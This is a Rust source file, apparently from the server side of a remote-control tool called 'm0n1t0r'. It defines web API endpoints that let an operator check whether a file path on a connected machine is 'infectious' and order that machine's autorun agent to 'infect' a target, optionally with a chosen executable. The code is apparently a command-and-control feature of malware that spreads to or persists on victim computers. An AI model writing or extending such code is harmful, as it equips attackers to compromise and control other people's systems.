use crate::web::{AppState, Response, Result as WebResult, api::client::get_agent};
use actix_web::{
    Responder, get, post,
    web::{Form, Json, Path, Query},
};
use m0n1t0r_common::{autorun::Agent as _, client::Client as _};
use serde::Deserialize;
use std::{net::SocketAddr, path::PathBuf};

#[derive(Deserialize)]
struct Infectious {
    target: PathBuf,
    exe: Option<PathBuf>,
}

#[get("/infectious")]
pub async fn get(
    data: AppState,
    addr: Path<SocketAddr>,
    Query(query): Query<Infectious>,
) -> WebResult<impl Responder> {
    let data = data.clone();
    let (autorun_agent, _) = get_agent!(data, &addr, autorun_agent)?;

    Ok(Json(Response::success(match query.exe {
        Some(exe) => autorun_agent.infectious_at(query.target, exe).await?,
        None => autorun_agent.infectious(query.target).await?,
    })?))
}

#[post("/infectious")]
pub async fn post(
    data: AppState,
    addr: Path<SocketAddr>,
    Form(form): Form<Infectious>,
) -> WebResult<impl Responder> {
    let (agent, _) = get_agent!(data, &addr, autorun_agent)?;

    Ok(Json(Response::success(match form.exe {
        Some(exe) => agent.infect_at(form.target, exe).await?,
        None => agent.infect(form.target).await?,
    })?))
}
